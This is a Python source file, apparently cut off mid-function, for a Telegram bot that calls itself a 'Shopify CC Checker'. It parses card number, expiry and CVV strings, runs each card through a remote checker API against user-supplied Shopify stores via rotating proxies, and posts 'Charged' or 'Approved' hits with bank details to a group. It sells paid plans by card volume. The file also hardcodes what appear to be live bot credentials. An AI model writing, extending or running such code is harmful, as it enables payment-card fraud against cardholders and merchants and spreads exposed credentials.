# bot.py - Beautiful Shopify CC Checker Bot (Complete)
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
from datetime import datetime
from urllib.parse import urlparse, quote
from typing import Optional, List

# Import database
from database import (
    init_db, db,
    ensure_user, get_user_plan, set_user_plan, is_premium_user,
    is_banned_user, ban_user, unban_user,
    create_key, get_key_data, use_key, get_all_keys,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db,
    add_global_site, get_global_sites, remove_global_site,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_all_premium_users, get_total_users, get_premium_count,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail,
    keys_col
)

# ====================== CONFIGURATION ======================
API_ID = int(os.getenv("API_ID", "36442788"))
API_HASH = os.getenv("API_HASH", "a46cfef94ef9de4026597c6a4addf073")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8180020111:AAFnyWXzcet_bW3d03Oq-04bHWa5YDCgNY8")
ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "[6598607558]"))
GROUP_ID = int(os.getenv("GROUP_ID", "-1003684602999"))

# Original Checker API (UNCHANGED)
CHECKER_API_URL = 'https://web-production-a8008.up.railway.app/shopify'
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ====================== CUSTOM EMOJIS ======================
CE = {
    "check":  6023660820544623088,
    "fire":   5999340396432333728,
    "cross":  6037570896766438989,
    "bolt":   6026367225466720832,
    "star":   5971944878815317190,
    "globe":  6026367225466720832,
    "chart":  5971837723676249096,
    "shield": 5974235702701853774,
    "brain":  6057466460886799210,
    "crown":  4949560993840629085,
    "gem":    5971944878815317190,
    "pause":  6001440193058444284,
    "play":   6285315214673975495,
    "stop":   5420323339723881652,
    "info":   5971837723676249096,
    "gift":   6066395745139824604,
    "eyes":   5974235702701853774,
    "trash":  5971837723676249096,
    "tick":   5974235702701853774,
    "warn":   5420323339723881652,
    "link":   6023660820544623088,
    "plus":   6023660820544623088,
    "search": 5971837723676249096,
    "pin":    5971837723676249096,
    "joker":  6023660820544623088,
    "party":  6282977077427702833,
}
PE = "⭐"

# ====================== GLOBAL STATE ======================
ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
USER_APPROVED_PREF = {}
TEMP_WORKING_SITES = {}

MAINTENANCE_FILE = "maintenance.json"
_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}

# ====================== DEAD SITE INDICATORS ======================
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

# ====================== STYLED MESSAGE SYSTEM ======================
client_instance = None

def _build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx = 0
        utf16_pos = 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]
                ))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = _build_entities(html_text, emoji_ids)
        return await event.reply(text, formatting_entities=entities,
                                  buttons=buttons, file=file, link_preview=False)
    except Exception as e:
        print(f"styled_reply error: {e}")
        try:
            return await event.reply(html_text[:4000], parse_mode='html', link_preview=False)
        except:
            return None

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = _build_entities(html_text, emoji_ids)
        return await client_instance.send_message(
            chat_id, text, formatting_entities=entities,
            buttons=buttons, file=file, link_preview=False
        )
    except Exception as e:
        print(f"styled_send error: {e}")
        return None

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = _build_entities(html_text, emoji_ids)
        await msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False)
    except Exception as e:
        if "not modified" not in str(e).lower():
            print(f"styled_edit error: {e}")

def pbtn(text, data=None, url=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ====================== MAINTENANCE MODE ======================
async def set_maintenance_mode(enabled: bool):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
            await f.write(json.dumps({"maintenance": enabled}))
        _MAINTENANCE_CACHE["enabled"] = enabled
        _MAINTENANCE_CACHE["last_check"] = time.time()
    except Exception as e:
        print(f"Error setting maintenance: {e}")

async def get_maintenance_mode() -> bool:
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and (now - _MAINTENANCE_CACHE["last_check"] < 30):
        return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE):
            return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
            data = json.loads(await f.read())
            _MAINTENANCE_CACHE["enabled"] = data.get("maintenance", False)
            _MAINTENANCE_CACHE["last_check"] = now
            return _MAINTENANCE_CACHE["enabled"]
    except Exception:
        return False

async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(
            event,
            f"{PE} <b>MAINTENANCE MODE</b>\n━━━━━━━━━━━━━━━━━\n"
            f"Bot is under maintenance.\nOnly admins can use it right now.\n\n"
            f"Please try again later.",
            emoji_ids=[CE["stop"], CE["warn"]]
        )
        return True
    return False

# ====================== ACCESS & PLAN SYSTEM ======================
async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"
    plan = await get_user_plan(user_id)
    is_private = chat.id == user_id
    access_type = f"{plan}_private" if is_private else f"{plan}_group"
    return True, access_type

async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id):
        return False, "banned", "free"
    plan = await get_user_plan(event.sender_id)
    is_private = event.chat.id == event.sender_id
    return True, f"{plan}_private" if is_private else f"{plan}_group", plan

def get_cc_limit(plan: str, user_id=None):
    if user_id and user_id in ADMIN_ID:
        return 5000
    p = plan.lower() if plan else "free"
    if "toji" in p:
        return 5000
    if "pro" in p or "premium" in p:
        return 2000
    return 300

def banned_user_message():
    text = f"{PE} <b>BANNED</b>\n━━━━━━━━━━━━━━━\nYou are not allowed to use this bot.\n\n{PE} Appeal ━ Contact Admin"
    emojis = [CE["stop"], CE["star"]]
    return text, emojis

# ====================== KEY HELPERS ======================
def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def create_plan_key(key, plan_type, days):
    try:
        await keys_col.insert_one({
            "key": key,
            "plan_type": plan_type,
            "days": days,
            "used": False,
            "used_by": None,
            "used_at": None,
            "created_at": datetime.utcnow()
        })
        return True
    except Exception as e:
        print(f"Error creating plan key: {e}")
        return False

async def use_plan_key(user_id, key):
    try:
        doc = await keys_col.find_one({"key": key})
        if not doc:
            return False, "Invalid key!"
        if doc.get("used"):
            return False, "Key already used!"
        plan_type = doc.get("plan_type", "pro")
        days = doc.get("days", 30)
        await keys_col.update_one(
            {"key": key},
            {"$set": {
                "used": True,
                "used_by": user_id,
                "used_at": datetime.utcnow()
            }}
        )
        await set_user_plan(user_id, plan_type, days)
        return True, f"{plan_type.upper()} plan activated for {days} days!"
    except Exception as e:
        return False, f"Error: {e}"

async def get_all_plan_keys(limit=50):
    cursor = keys_col.find().sort("created_at", -1).limit(limit)
    return await cursor.to_list(length=limit)

async def delete_plan_key(key):
    try:
        result = await keys_col.delete_one({"key": key})
        return result.deleted_count > 0
    except:
        return False

# ====================== UTILITIES ======================
def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
            domain = parsed.netloc
        except:
            return False
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    for line in text.split('\n'):
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned and is_valid_url_or_domain(cleaned):
            clean_urls.add(cleaned)
    return list(clean_urls)

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    if not proxy:
        return None
    
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)

    host, port, username, password = '', '', '', ''

    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None

    try:
        port_num = int(port)
        if not (0 < port_num <= 65535):
            return None
    except:
        return None

    if username and password:
        proxy_url = f"{proxy_type}://{username}:{password}@{host}:{port}"
    else:
        proxy_url = f"{proxy_type}://{host}:{port}"

    return {
        'ip': host,
        'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

def format_proxy_for_api(p):
    if p.get('username') and p.get('password'):
        return f"{p['ip']}:{p['port']}:{p['username']}:{p['password']}"
    return f"{p['ip']}:{p['port']}"

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://httpbin.org/ip', proxy=proxy_url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return True, data.get('origin', 'Unknown')
                return False, f"HTTP {resp.status}"
    except aiohttp.ClientProxyConnectionError:
        return False, "Proxy connection refused"
    except aiohttp.ClientConnectorError as e:
        return False, f"Cannot connect: {str(e)[:50]}"
    except asyncio.TimeoutError:
        return False, "Connection timeout"
    except Exception as e:
        error_str = str(e)
        if '403' in error_str:
            return False, "Proxy blocked"
        return False, error_str[:50]

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    return (
                        data.get('brand', '-'),
                        data.get('type', '-'),
                        data.get('level', '-'),
                        data.get('bank', '-'),
                        data.get('country_name', '-'),
                        data.get('country_flag', '')
                    )
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

def get_status_header(status):
    if status == "Charged":
        return (f"{PE} CHARGED {PE}", [CE["gem"], CE["gem"]])
    elif status == "Approved":
        return (f"{PE} APPROVED {PE}", [CE["check"], CE["check"]])
    elif status == "Site Error" or status == "SiteError":
        return (f"{PE} SITE ERROR {PE}", [CE["warn"], CE["warn"]])
    elif status == "Error":
        return (f"{PE} ERROR {PE}", [CE["cross"], CE["cross"]])
    else:
        return (f"{PE} DECLINED {PE}", [CE["cross"], CE["cross"]])

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        
        params = {
            'cc': card,
            'site': site,
            'proxy': proxy
        }
        
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                if resp.status != 200:
                    return {
                        'status': 'Site Error', 
                        'message': f'API Error: HTTP {resp.status}', 
                        'card': card, 
                        'retry': True
                    }
                
                try:
                    raw = await resp.json()
                except:
                    return {
                        'status': 'Error',
                        'message': 'Invalid API response',
                        'card': card,
                        'retry': True
                    }
        
        response_msg = raw.get('Response', raw.get('message', ''))
        price = raw.get('Price', raw.get('price', '-'))
        gate = raw.get('Gate', raw.get('gateway', 'shopiii'))
        status = raw.get('Status', raw.get('status', ''))
        
        response_lower = str(response_msg).lower()
        
        if status == 'Charged' or 'charged' in response_lower or 'order completed' in response_lower:
            return {
                'status': 'Charged', 
                'message': response_msg[:150], 
                'card': card,
                'site': site, 
                'gateway': gate, 
                'price': price
            }
        
        approved_keywords = ['approved', 'success', 'insufficient_funds', 'invalid_cvv', 'incorrect_cvv']
        if status == 'Approved' or any(kw in response_lower for kw in approved_keywords):
            return {
                'status': 'Approved', 
                'message': response_msg[:150], 
                'card': card,
                'site': site, 
                'gateway': gate, 
                'price': price
            }
        
        retry_keywords = ['proxy', 'timeout', 'connection', 'ssl', 'cloudflare']
        if any(kw in response_lower for kw in retry_keywords):
            return {
                'status': 'Site Error',
                'message': response_msg[:100],
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price
            }
        
        return {
            'status': 'Dead', 
            'message': response_msg[:100] if response_msg else 'Declined', 
            'card': card,
            'site': site, 
            'gateway': gate, 
            'price': price
        }
        
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e).lower()
        if 'proxy' in error_msg or 'connection' in error_msg:
            return {'status': 'Site Error', 'message': str(e)[:100], 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': str(e)[:100], 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card,
                'gateway': 'Unknown', 'price': '-'}
    
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card,
                'gateway': 'Unknown', 'price': '-'}
    
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        
        result = await check_card(card, site, proxy)
        
        if not result.get('retry'):
            return result
        
        last_result = result
        
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    
    if last_result:
        return {
            'status': 'Dead', 
            'message': f'All retries failed: {last_result["message"][:100]}',
            'card': card, 
            'gateway': last_result.get('gateway', 'Unknown'),
            'price': last_result.get('price', '-'), 
            'site': 'Multiple'
        }
    
    return {
        'status': 'Dead', 
        'message': 'Max retries exceeded - all proxies/sites failed', 
        'card': card,
        'gateway': 'Unknown', 
        'price': '-'
    }

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead'}
                try:
                    raw = await resp.json()
                    response_msg = raw.get('Response', '').lower()
                    if is_dead_site_error(response_msg):
                        return {'site': site, 'status': 'dead'}
                    return {'site': site, 'status': 'alive'}
                except:
                    return {'site': site, 'status': 'dead'}
    except:
        return {'site': site, 'status': 'dead'}

client = TelegramClient('cc_bot', API_ID, API_HASH)
client_instance = client

async def send_realtime_hit(user_id, result, hit_type, username):
    if hit_type == "Charged":
        status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        header_emojis = [CE["gem"], CE["gem"]]
    else:
        status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
        header_emojis = [CE["check"], CE["check"]]
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    
    message = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ HIT FOUND</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Status ━ <b>{status_text}</b>
{PE} Card ━ <code>{result['card']}</code>
{PE} Response ━ {result['message'][:150]}
{PE} Gateway ━ {result.get('gateway', 'Unknown')}
{PE} Price ━ {result.get('price', '-')}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>
━━━━━━━━━━━━━━━━━
{PE} User ━ @{username}"""
    
    emoji_ids = [CE["fire"], CE["fire"], CE["star"], CE["gem"], CE["info"],
                 CE["bolt"], CE["globe"], CE["chart"], CE["brain"]] + header_emojis
    
    try:
        await styled_send(GROUP_ID, message, emoji_ids=emoji_ids)
    except Exception as e:
        print(f"Hit notification error: {e}")

async def pin_charged_message(event, message):
    try:
        if event.is_group:
            await message.pin()
    except:
        pass

# ====================== COMMAND HANDLERS ======================

# START COMMAND
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        _, access_type = await can_use(event.sender_id, event.chat)
        
        if access_type == "banned":
            ban_text, ban_emojis = banned_user_message()
            return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
        
        plan = await get_user_plan(event.sender_id)
        limit = get_cc_limit(plan, event.sender_id)
        
        if plan in ["pro", "toji"]:
            status_line = f"{PE} <b>STATUS</b> ━ {plan.upper()} {PE} (<code>{limit}</code> CCs)"
            status_emojis = [CE["star"], CE["crown"]]
        else:
            status_line = f"{PE} <b>STATUS</b> ━ Free Tier (<code>{limit}</code> CCs)"
            status_emojis = [CE["star"]]
        
        if event.sender_id in ADMIN_ID and await get_maintenance_mode():
            status_line += "\n\n⚠️ <b>MAINTENANCE MODE ACTIVE</b>"
        
        text = f"""{PE} <b><i>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ Checker Commands</i></b>
|   {PE} <code>/cc</code> ━ Single CC check
|   {PE} <code>/chk</code> ━ Mass CC from <code>.txt</code> file
|   {PE} <code>/ran</code> ━ Check with sites.txt

{PE} <b><i>Site Management</i></b>
|   {PE} <code>/add</code> ━ Add site(s) to your DB
|   {PE} <code>/rm</code> ━ Remove site(s) from DB
|   {PE} <code>/sites</code> ━ View your saved sites
|   {PE} <code>/site</code> ━ Test all sites & remove dead

{PE} <b><i>Proxy Management</i></b> (Private Only)
|   {PE} <code>/addpxy</code> ━ Add proxy (max 100)
|   {PE} <code>/proxy</code> ━ View saved proxies
|   {PE} <code>/chkpxy</code> ━ Test proxy status
|   {PE} <code>/rmpxy</code> ━ Remove proxy

{PE} <b><i>Account</i></b>
|   {PE} <code>/info</code> ━ Your profile & stats
|   {PE} <code>/redeem</code> ━ Redeem a premium key
|   {PE} <code>/plan</code> ━ View plans

{status_line}"""
        
        kb = [
            [pbtn("💎 Plans", data="show_plans"), pbtn("📞 Support", url="https://t.me/MRROOTTG")],
        ]
        
        emoji_ids = [
            CE["bolt"],
            CE["search"], CE["pin"], CE["brain"],
            CE["plus"], CE["cross"], CE["globe"], CE["link"],
            CE["shield"],
            CE["link"], CE["eyes"], CE["tick"], CE["trash"],
            CE["info"],
            CE["info"], CE["gift"], CE["gem"]
        ] + status_emojis
        
        await styled_reply(event, text, buttons=kb, emoji_ids=emoji_ids)
    except Exception as e:
        print(f"[START ERROR] {e}")
        await event.reply(f"Error: {e}")

# PLAN COMMAND
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await check_maintenance(event):
        return
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    current_plan = await get_user_plan(event.sender_id)
    
    text = f"""{PE} <b>AVAILABLE PLANS</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} <b>FREE</b> ━ 300 CCs (Group only)
{PE} <b>PRO</b> ━ 2000 CCs + Proxy + Private
{PE} <b>TOJI</b> ━ 5000 CCs + Priority + Lifetime
━━━━━━━━━━━━━━━━━

Current Plan: <b>{current_plan.upper()}</b>

Contact admin to upgrade your plan."""
    
    kb = [[pbtn("💰 Upgrade Now", url="https://t.me/MRROOTTG")]]
    emoji_ids = [CE["crown"], CE["crown"], CE["star"], CE["gem"], CE["fire"]]
    
    await styled_reply(event, text, buttons=kb, emoji_ids=emoji_ids)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_callback(event):
    current_plan = await get_user_plan(event.sender_id)
    
    text = f"""{PE} <b>AVAILABLE PLANS</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} <b>FREE</b> ━ 300 CCs (Group only)
{PE} <b>PRO</b> ━ 2000 CCs + Proxy + Private
{PE} <b>TOJI</b> ━ 5000 CCs + Priority + Lifetime
━━━━━━━━━━━━━━━━━

Current Plan: <b>{current_plan.upper()}</b>

Contact admin to upgrade."""
    
    await event.answer()
    kb = [[pbtn("💰 Upgrade Now", url="https://t.me/MRROOTTG")]]
    emoji_ids = [CE["crown"], CE["crown"], CE["star"], CE["gem"], CE["fire"]]
    await styled_send(event.chat_id, text, buttons=kb, emoji_ids=emoji_ids)

# INFO COMMAND
@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await check_maintenance(event):
        return
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    await ensure_user(event.sender_id)
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    sites = await get_user_sites(event.sender_id)
    proxies_count = await get_proxy_count(event.sender_id)
    
    text = f"""{PE} <b>YOUR PROFILE</b>
━━━━━━━━━━━━━━━━━
{PE} User ID ━ <code>{event.sender_id}</code>
{PE} Plan ━ <b>{plan.upper()}</b>
{PE} CC Limit ━ <code>{limit}</code>
{PE} Sites ━ <code>{len(sites)}</code>
{PE} Proxies ━ <code>{proxies_count}/100</code>
━━━━━━━━━━━━━━━━━"""
    
    emoji_ids = [CE["info"], CE["star"], CE["crown"], CE["chart"], CE["link"], CE["shield"]]
    await styled_reply(event, text, emoji_ids=emoji_ids)

# REDEEM COMMAND
@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem'))
async def redeem_cmd(event):
    if await check_maintenance(event):
        return
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await styled_reply(
                event,
                f"{PE} <b>Usage:</b> <code>/redeem KEY</code>\n\n"
                f"Redeem your plan key to activate premium features.",
                emoji_ids=[CE["warn"]]
            )
        
        key = parts[1].upper()
        await ensure_user(event.sender_id)
        
        current_plan = await get_user_plan(event.sender_id)
        if current_plan in ["pro", "toji"]:
            return await styled_reply(
                event,
                f"{PE} You already have <b>{current_plan.upper()}</b> plan active!\n\n"
                f"Cannot redeem another key while premium is active.",
                emoji_ids=[CE["crown"]]
            )
        
        success, result = await use_plan_key(event.sender_id, key)
        
        if not success:
            return await styled_reply(event, f"{PE} {result}", emoji_ids=[CE["cross"]])
        
        plan_info = result.split(" plan")[0].upper()
        
        if "TOJI" in plan_info:
            cc_limit = 5000
            plan_display = "👑 TOJI"
            plan_emoji = CE["crown"]
        elif "PRO" in plan_info:
            cc_limit = 2000
            plan_display = "💎 PRO"
            plan_emoji = CE["gem"]
        else:
            cc_limit = 300
            plan_display = "🆓 FREE"
            plan_emoji = CE["star"]
        
        response = f"""{PE} <b>Plan Activated Successfully!</b>
━━━━━━━━━━━━━━━━━
Plan: {plan_display}
━━━━━━━━━━━━━━━━━
✓ CC Limit: <code>{cc_limit}</code>
✓ Proxy Support: Yes (max 100)
✓ Private Chat: Unlocked
━━━━━━━━━━━━━━━━━
{PE} Use <code>/info</code> to see your profile
{PE} Add proxies with <code>/addpxy</code>
{PE} Add sites with <code>/add</code>"""
        
        await styled_reply(event, response, emoji_ids=[plan_emoji, CE["check"], CE["star"], CE["info"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

# SITE MANAGEMENT COMMANDS
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    if await check_maintenance(event):
        return
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    try:
        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if not add_text:
            return await styled_reply(event, f"{PE} Format: <code>/add site.com site2.com</code>", emoji_ids=[CE["warn"]])
        
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add:
            return await styled_reply(event, f"{PE} No valid URLs found", emoji_ids=[CE["cross"]])
        
        await ensure_user(event.sender_id)
        added_sites = []
        already_exists = []
        
        for site in sites_to_add:
            if await add_site_db(event.sender_id, site):
                added_sites.append(site)
            else:
                already_exists.append(site)
        
        response_parts = []
        emoji_ids = []
        
        if added_sites:
            response_parts.append(f"{PE} <b>Added Sites:</b>\n" + "\n".join(f"{PE} <code>{s}</code>" for s in added_sites))
            emoji_ids.extend([CE["check"]] + [CE["link"]] * len(added_sites))
        
        if already_exists:
            response_parts.append(f"{PE} <b>Already Exist:</b>\n" + "\n".join(f"{PE} <code>{s}</code>" for s in already_exists))
            emoji_ids.extend([CE["warn"]] + [CE["link"]] * len(already_exists))
        
        if response_parts:
            await styled_reply(event, "\n\n".join(response_parts), emoji_ids=emoji_ids)
        else:
            await styled_reply(event, f"{PE} No new sites to add", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    if await check_maintenance(event):
        return
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    try:
        rm_text = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if not rm_text:
            return await styled_reply(event, f"{PE} Format: <code>/rm site.com</code>", emoji_ids=[CE["warn"]])
        
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove:
            return await styled_reply(event, f"{PE} No valid URLs found", emoji_ids=[CE["cross"]])
        
        removed = []
        not_found = []
        
        for site in sites_to_remove:
            if await remove_site_db(event.sender_id, site):
                removed.append(site)
            else:
                not_found.append(site)
        
        response_parts = []
        emoji_ids = []
        
        if removed:
            response_parts.append(f"{PE} <b>Removed:</b>\n" + "\n".join(f"{PE} <code>{s}</code>" for s in removed))
            emoji_ids.extend([CE["check"]] + [CE["trash"]] * len(removed))
        
        if not_found:
            response_parts.append(f"{PE} <b>Not Found:</b>\n" + "\n".join(f"{PE} <code>{s}</code>" for s in not_found))
            emoji_ids.extend([CE["cross"]] + [CE["link"]] * len(not_found))
        
        if response_parts:
            await styled_reply(event, "\n\n".join(response_parts), emoji_ids=emoji_ids)
        else:
            await styled_reply(event, f"{PE} No sites removed", emoji_ids=[CE["cross"]])
    except Exception as e:
        await styled_reply(event, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    if await check_maintenance(event):
        return
    if await is_banned_user(event.sender_id):
        ban_text, ban_emojis = banned_user_message()
        return await styled_reply(event, ban_text, emoji_ids=ban_emojis)
    
    sites = await get_user_sites(event.sender_id)
    
    if not sites:
        return await styled_reply(event, f"{PE} No sites added yet.\n\nUse <code>/add</code> to add sites.", emoji_ids=[CE["warn"]])
    
